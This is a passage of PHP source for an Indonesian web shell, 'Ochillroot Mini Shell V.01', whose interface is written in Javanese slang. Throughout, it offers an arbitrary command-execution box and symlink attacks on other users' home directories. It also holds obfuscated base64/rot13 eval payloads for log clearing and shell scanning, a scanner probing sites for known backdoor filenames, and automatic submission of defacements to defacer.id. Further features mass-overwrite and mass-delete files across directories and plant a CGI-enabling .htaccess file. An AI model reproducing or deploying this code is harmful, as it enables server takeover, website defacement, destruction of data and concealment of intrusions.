$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<div class='mybox'>
<table align=center border=1><tr>
<td align=center><font size=3>ID</font></td>
<td align=center><font size=3>Users</font></td>
<td align=center><font size=3>Symlink</font></td></tr>";
$temp = "";$val1 = 0;$val2 = 1000;
for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
if ($uid)$temp .= join(':',$uid)."\n";}
echo '<br/>';$temp = trim($temp);$file5 =
fopen("valens1a.txt","w");
fputs($file5,$temp);
fclose($file5);$dcount = 1;$file =
fopen("valens1a.txt", "r") or exit("Unable to open file!");
while(!feof($file)){$s = fgets($file);$matches = array();
$t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
continue;
echo "<tr><td align=center><font size=2>" . $dcount . "</td>
<td align=center><font class=txt>" . $matches . "</td>";
echo "<td align=center><font class=txt><a href=$full/valens1a_smylink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
$dcount++;}
fclose($file);
echo "</table></div></center>";unlink("valens1a.txt");
} else
echo "<center><font size=3>Gaisok Gawe Symlink</font></center>";
}
}
}elseif($_GET['ochill_valens1a'] == 'defacerid') {
echo "<center><form method='post'>
<u>Jeneng Defacer</u>: <br>
<input type='text' name='hekel' size='50' value='Hacked By V A L E N S 1 A'><br>
<u>Jeneng Team</u>: <br>
<input type='text' name='tim' size='50' value='No Team'><br>
<u>Jeneng Domains</u>: <br>
<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
<input type='submit' name='go' value='Submit' style='width: 450px;'>
</form>";
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}elseif($_GET['ochill_valens1a'] == 'valens1a_zip') {
function rmdir_recursive($dir) {
foreach(scandir($dir) as $file) {
if ('.' === $file || '..' === $file) continue;
if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
else unlink("$dir/$file");
}
rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
$filename = $_FILES["zip_file"]["name"];
$source = $_FILES["zip_file"]["tmp_name"];
$type = $_FILES["zip_file"]["type"];
$name = explode(".", $filename);
$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
foreach($accepted_types as $mime_type) {
if($mime_type == $type) {
$okay = true;
break;
}
}
$continue = strtolower($name[1]) == 'zip' ? true : false;
if(!$continue) {
$message = "Iku guduk ZIP cok!";
}
$path = dirname(__FILE__).'/';
$filenoext = basename ($filename, '.zip');
$filenoext = basename ($filenoext, '.ZIP');
$targetdir = $path . $filenoext;
$targetzip = $path . $filename;
if (is_dir($targetdir)) rmdir_recursive ( $targetdir);
mkdir($targetdir, 0777);
if(move_uploaded_file($source, $targetzip)) {
$zip = new ZipArchive();
$x = $zip->open($targetzip);
if ($x === true) {
$zip->extractTo($targetdir);
$zip->close();

unlink($targetzip);
}
$message = "<b>Isok Cok!</b>";
} else {
$message = "<b>Gaisok Cok!</b>";
}
}
echo '<table style="width:100%" border="1">
<tr><td><h2>Upload Terus Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip Sempak : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Ngelebokne Zipmu" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Simpen Nang:</font><br><input type='text' name='save' value='$dir/valens1a_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";
if($_POST['backup']){
$save=$_POST['save'];
function Zip($source, $destination)
{
if (extension_loaded('zip') === true)
{
if (file_exists($source) === true)
{
$zip = new ZipArchive();

if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
{
$source = realpath($source);

if (is_dir($source) === true)
{
$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

foreach ($files as $file)
{
$file = realpath($file);

if (is_dir($file) === true)
{
$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
}

else if (is_file($file) === true)
{
$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
}
}
}

else if (is_file($source) === true)
{
$zip->addFromString(basename($source), file_get_contents($source));
}
}

return $zip->close();
}
}

return false;
}
Zip($_POST['dir'],$save);
echo "Mari , Simpen Nang <b>$save</b>";
}
echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/valens1a.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Simpen Nang:</font><br><input type='text' name='save' value='$dir/valens1a_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
if($_POST['extrak']){
$save=$_POST['save'];
$zip = new ZipArchive;
$res = $zip->open($_POST['dir']);
if ($res === TRUE) {
$zip->extractTo($save);
$zip->close();
echo 'Mari, Simpen Nang : <b>'.$save.'</b>';
} else {
echo 'Gaisok Mas!';
}
}
echo '</tr></table>';
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();
}elseif($_GET['ochill_valens1a'] == 'valens1a_ckshl') {
echo "<font face=Comic Sans MS size='2' color=lime>WOCOEN SEK: </font><font face=Comic Sans MS size='2' color=white>Enteni sampek loadingane selesai cok => lek wes mari hasilne bakalan metu.<br>Lek loadingane suwi, berarti nemu shell akeh.</font>";
eval(str_rot13(gzinflate(str_rot13(base64_decode(('1UddeNswFH1eIP/hUxTiT5a0G31Lm5jRkZS9DBrKHpoWIxlWYRoU+zr2Io/+9135q0G77rEwk2BWPuee+6WLZCaAWnDkGqXf71pGIQvgpsDZHVhyEQuuWpLcMTCxzgWnRk0XqDOR0DoUV98xx9P4qI1RA6E1MXPCJigJkHYdnkImezJwxWsjIrnGrco1jnBEWR6MUq5BzTjMTzJby1PS0iYWSc1BQs9AijUtQfzppNHwp1tM/WYeUxpveJQiooq2W82JqzchSfsi18+GF82eZyNqYxtMkwPfCYt7QxlNWLL7AVI0nbhR+Oyi31gjXoYOO9SBiyeQqE/BFQaxVdA70hmSy8fwu98DbY4yNBS8gkzFqGkt7KJTKXpn5EDkpdLSeHWrk/sRfBnB5xYZEig0kvSI/8pBUyUgAD6G1mwzPB+OiLIauvPh/QHMpYGg5Zpx6kJsCl7rzQw+nZy0oZTMh5zqJaQjBovl/Ptlvm/z5e3l1TL4ZH09X7DGQ4n+FSWRJSwr02wOtbvAuqCtVTavMV2IZneAUqg3esAHXrnneG5l67GdTHBgxS7I90SQUVcEroZ5R/syquSOO8afOq6sJTVwNGouN66OgfV7B/6mGX1BUoj8H2XMsK5VTU32iDttSRkBlZpt3nhCjrscrGEjbgTf+WcXuWn3QMjZjVHk/iUXe9eZXEaD1ij4CEYDmcSUGpqR850w3EgwkrpjFnmt4Xv/xffppLxYMPGbY58ArcIXLWT2oiXeaZNH4k2lppOK48NCN2C4sbBA+YASlkVFQg3eI5qDYf5C6i0x8WLMHt6h4v0e/VzFZqVDe1TBt8vF1XdLDViaIJ3BU2ZQaHONWBsFWxNVoZ03NaGcs45upDQbrwmdUyuaOKMeqywaSNk+dbKyB8vhNqBWwV7f/jfGMStW7C/3vX7VVi+T0KT+1si8HP16kl1tiPDhDw=='))))));
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();
} elseif($_GET['ochill_valens1a'] == 'valens1a_shlglk') {
echo "<font face=Comic Sans MS size='2' color=lime>WOCOEN SEK: </font><font face=Comic Sans MS size='2' color=white>Enteni sampek loadingane selesai cok => lek wes mari hasilne bakalan metu.</font>";
echo'<form action="" method="post">
<br><input type="text" size="50" name="kontlo" value="http://www.websitemucok.com/"/>
<br>
<input name="scan" value="Mulai golek shell cok!" style="width: 215px;" type="submit">
</form><br>';
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();
if (isset($_POST["scan"])) {
$url = $_POST['kontlo'];
echo "<br /><span class='start'>Nemu shell nang ".$url."<br /><br /></span>";
echo "Hasil :<br />";
$shells = array("valens1a.php","ochillroot.php","WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/valens1a.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl",
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/",
"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php","hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73ction.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasmu.php","cox.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","z.php");
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); //
if (eregi('200', $headers[0])) {
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Mari!</span><br /><br/><br/>"; //
$dz = fopen('valens1a_nemushell.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
echo "Shell [ <a href='./valens1a_nemushell.txt' target='_blank'>valens1a_nemushell.txt</a> ]</span>";
}
}elseif($_GET['ochill_valens1a'] == 'valens1a_logclr'){
echo "<font face=Comic Sans MS size='2' color=lime>WOCOEN SEK: </font><font face=Comic Sans MS size='2' color=white>Enteni sampek loadingane selesai cok => lek wes mari hasilne bakalan metu.<br>Lek loadingane suwi, berarti hasil log akeh cok nang web iki.</font>";
eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();

} elseif($_GET['ochill_valens1a'] == 'valens1a') {

echo "<script>function copy(text) { window.prompt('Copy to clipboard: Ctrl+C, Enter', text); }</script><center><font color='lime'><pre>
____ ____ _____ .____ ___________ _______ _________ ____ _____
\ \ / / / _ \ | | \_ _____/ \ \ / _____/ /_ | / _ \
\ Y / / /_\ \ | | | __)_ / | \ \_____ \ | | / /_\ \
\ / / | \ | |___ | \ / | \ / \ | | / | \
\___/ \____|__ / |_______ \ /_______ / \____|__ / /_______ / |___| \____|__ /
\/ \/ \/ \/ \/ \/

</pre></font>
<span align='left'>
<ul>
<li><br><font color=white>
Special Greets to: <a class='wenk' href='https://www.facebook.com/indoxploit/' target='_BLANK'>IndoXploit</a> | <a class='wenk' href='https://www.facebook.com/JavaDefacerTeam/' target='_BLANK'>JavaDefacerTeam</a> | <a class='wenk' href='https://www.facebook.com/DefacerTersakitiTeam/' target='_BLANK'>DefacerTersakitiTeam</a><br>
Contact Me: <a class='wenk' href='https://www.facebook.com/ochillbintang' target='_BLANK'>V A L E N S 1 A</a> | <a class='wenk' href='https://www.facebook.com/dewapratama.phtml' target='_BLANK'>Annanda H4x0r</a></font><br></li>
</ul></span><center>
<a onclick='copy(\"valens1a.nathan1a@yahoo.com\")'><font color='red'>Report a bug</font></a><br>
</center>
<span align='left'>
<ul><li>
<br><font face=Comic Sans MS size='2' color=white>
Ochillroot Mini Shell V.01 iki gabungan teko shell mini.php HSH , IndoXploit Shell V.2 , StupidC0de Shell.
<br>######################################################################################################
<br>Suwon gawe Uwong-uwong seng ngajari aku opo ae, mulai teko deface lan ngode-ngode perasaanmu.
<br>Shell iki ga sepenuhne coding manual, Shell iki hasil recode teko shell IndoXploit karo mini.php HSH.
<br>Tapi Selebihne, iku hasil kreasi Arek IndoXploit dewe.
<br>Lek onok perlu opo-opo contact ae.
<br>Script iki vulgar kok koyok mia khalifa, dadi gausah ngomong lek iki log. (bosen dituduh cok.)
<br>Tanpa onok kon kabeh aku ga iso Opo-opo. Suwon seng ajari aku deface.
<br>Suwon gawe Tomhwak - Mr.K A.K.A Mailaikat Galau - Azhoka1337 - Aryo (Karyo) - Annanda H4x0r - Lan Liyane!.
<br>Ochill Mini Shell V.01 Coded By V A L E N S 1 A.
<br>Thanks: All Member IndoXploit - Indonesia Defacer Tersakiti Team & Konco-koncoKu Kabeh.
<br>######################################################################################################</font></li></ul></span>";
echo "<hr><p align='center'><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";
html_footer();

}elseif($_GET['ochill_valens1a'] == 'upload') {
echo "<center>";
if($_POST['upload']) {
if($_POST['tipe_upload'] == 'biasa') {
if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
$act = "<font color=lime>Ngelebokne</font> nang <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
} else {
$act = "<font color=red>Gagal Ngelebokne Sempak.</font>";
}
} else {
$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
$act = "<font color=lime>Sempakmu wes mlebu</font> nang <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
} else {
$act = "<font color=red>Gagal Ngelebokne Sempak.</font>";
}
} else {
$act = "<font color=red>Gagal Ngelebokne Sempak.</font>";
}
}
}
echo "Ngelebokne Sempak:
<form method='post' enctype='multipart/form-data'>
<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
<input type='radio' name='tipe_upload' value='home_root'>Fake Home [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
<input type='file' name='ix_file'>
<input type='submit' value='Ngelebokne' name='upload'>
</p></form>";
echo $act;
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Mbalek Gasido Ngelebokne Sempak ]</a></center><hr>";

html_footer();
} elseif($_GET['ochill_valens1a'] == 'cmd') {
echo "<form method='post'>
<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
</form>";
if($_POST['do_cmd']) {
echo "<pre>".exe($_POST['cmd'])."</pre>";
}
} elseif($_GET['ochill_valens1a'] == 'valens1a_mainsabun') {
echo "<center><form action=\"\" method=\"post\">\n";
$dirr=$_POST['d_dir'];
$index = $_POST["script"];
$index = str_replace('"',"'",$index);
$index = stripslashes($index);
function edit_file($file,$index){
if (is_writable($file)) {
clear_fill($file,$index);
echo "<Span style='color:lime;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
}
else {
echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
}
}
function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
if(file_exists("$dir/$namafile")) {
unlink("$dir/$namafile");
}
} elseif($dirb === '..') {
if(file_exists("".dirname($dir)."/$namafile")) {
unlink("".dirname($dir)."/$namafile");
}
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
if(file_exists($lokasi)) {
echo "[<font color=lime>KEBUSEK</font>] $lokasi<br>";
unlink($lokasi);
$idx = hapus_massal($dirc,$namafile);
}
}
}
}
}
}
}
function clear_fill($file,$index){
if(file_exists($file)){
$handle = fopen($file,'w');
fwrite($handle,'');
fwrite($handle,$index);
fclose($handle); } }

function gass(){
global $dirr , $index ;
chdir($dirr);
$me = str_replace(dirname(__FILE__).'/','',__FILE__);
$files = scandir($dirr) ;
$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
sort($files);
$n = 0 ;
foreach ($files as $file){
if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ===>> ";
edit_file($file,$index);
flush();
$n = $n +1 ;
}
}
echo "<br>";
echo "<center><br><h3>$n Kali Anda Telah Ngecrot Disini </h3></center><br>";
}
function ListFiles($dirrall) {

if($dh = opendir($dirrall)) {

$files = Array();
$inner_files = Array();
$me = str_replace(dirname(__FILE__).'/','',__FILE__);
$notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
while($file = readdir($dh)) {
if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
if(is_dir($dirrall . "/" . $file)) {
$inner_files = ListFiles($dirrall . "/" . $file);
if(is_array($inner_files)) $files = array_merge($files, $inner_files);
} else {
array_push($files, $dirrall . "/" . $file);
}
}
}

closedir($dh);
return $files;
}
}
function gass_all(){
global $index ;
$dirrall=$_POST['d_dir'];
foreach (ListFiles($dirrall) as $key=>$file){
$file = str_replace('//',"/",$file);
echo "<center><strong>$file</strong> ===>";
edit_file($file,$index);
flush();
}
$key = $key+1;
echo "<center><br><h3>$key Kali Anda Telah Ngecrot Disini </h3></center><br>"; }
function sabun_massal($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
file_put_contents($lokasi, $isi_script);
} elseif($dirb === '..') {
file_put_contents($lokasi, $isi_script);
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
echo "[<font color=lime>MARI</font>] $lokasi<br>";
file_put_contents($lokasi, $isi_script);
$idx = sabun_massal($dirc,$namafile,$isi_script);
}
}
}
}
}
}
if($_POST['mass'] == 'onedir') {
echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
$ini="http://";
$mainpath=$_POST[d_dir];
$file=$_POST[d_file];
$dir=opendir("$mainpath");
$code=base64_encode($_POST[script]);
$indx=base64_decode($code);
while($row=readdir($dir)){
$start=@fopen("$row/$file","w+");
$finish=@fwrite($start,$indx);
if ($finish){
echo"$ini$row/$file\n";
}
}
echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
$mainpath=$_POST[d_dir];$file=$_POST[d_file];
$dir=opendir("$mainpath");
$code=base64_encode($_POST[script]);
$indx=base64_decode($code);
while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
$finish=@fwrite($start,$indx);
if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
}

}
elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
elseif($_POST['mass'] == 'massdeface') {
echo "<div style='margin: 5px auto; padding: 5px'>";
sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
echo "</div>"; }
else {
echo "<font face=Comic Sans MS size='2' color=lime>WOCOEN SEK: </font><font face=Comic Sans MS size='2' color=white>Enteni sampek loadingane selesai cok => lek wes mari hasilne bakalan metu.</font><br><br>";
echo "
<center>
<font style='text-decoration: underline;'>SABUN CAIR</font><br>
<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
<input type='hidden' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
<font style='text-decoration: underline;'>Tempat Lokasi Penyabunan:</font><br>
<textarea name='script' placeholder='Silahkan Menyiapkan Sabun Kesukaan Anda !! ^_^' style='width: 450px; height: 200px;'></textarea><br><br><br>
<font style='text-decoration: underline;'>
Pilihan Menu Sabun:<br>
</font>
<select class=\"select\" name=\"mass\" style=\"width: 200px;\" height=\"10\">
<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option></center></select><br><br>
<input type='submit' name='start' value='Silakan Disabun'>
</form>

<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} elseif($_GET['ochill_valens1a'] == 'mass_delete') {
function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
if(file_exists("$dir/$namafile")) {
unlink("$dir/$namafile");
}
} elseif($dirb === '..') {
if(file_exists("".dirname($dir)."/$namafile")) {
unlink("".dirname($dir)."/$namafile");
}
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
if(file_exists($lokasi)) {
echo "[<font color=lime>BUSEK</font>] $lokasi<br>";
unlink($lokasi);
$idx = hapus_massal($dirc,$namafile);
}
}
}
}
}
}
}
if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
} else {
echo "<center>";
echo "<form method='post'>
<font style='text-decoration: underline;'>Panggone Sempak:</font><br>
<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
<font style='text-decoration: underline;'>Jeneng Sempak:</font><br>
<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
<input type='submit' name='start' value='Busek Kabeh' style='width: 450px;'>
</form><hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";
html_footer();
}
} elseif($_GET['ochill_valens1a'] == 'config') {
$idx = mkdir("valens1a_config", 0777);
$isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
$htc = fopen("valens1a_config/.htaccess","w");
fwrite($htc, $isi_htc);
fclose($htc);
if(preg_match("/vhosts|vhost/", $dir)) {
$link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
